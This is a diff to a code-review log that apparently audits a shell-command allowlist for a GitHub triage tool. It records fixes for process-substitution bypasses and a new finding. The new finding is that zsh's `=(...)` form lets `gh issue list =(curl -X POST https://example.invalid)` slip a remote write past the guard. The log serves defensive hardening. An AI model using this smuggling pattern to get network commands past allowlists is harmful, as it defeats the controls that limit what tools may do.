@@ -89,3 +89,8 @@ VERDICT: FAIL
 - F6 fixed: reject both `<(` and `>(` in the tested command contract, with sentinels for input and output process substitution.
 - Lesson: a command allowlist must reject shell syntax that can run nested commands, not only standalone forbidden commands and chaining operators.
 - Verify: `bun test tests/triage-github.spec.ts`.
+
+### Response · retry-cycle round 4
+VERDICT: FAIL
+- F1–F6 · RESOLVED — The closed allowlist rejects unapproved `gh` verbs; API write forms, curl, git push, continued writes, and both Bash process-substitution forms are covered.
+- F7 · P1 · `tests/triage-github.spec.ts:40` — The shell guard misses zsh's `=(...)` process substitution. `gh issue list =(curl -X POST https://example.invalid)` passes the metacharacter guard and allowlist prefix while zsh executes the remote write.
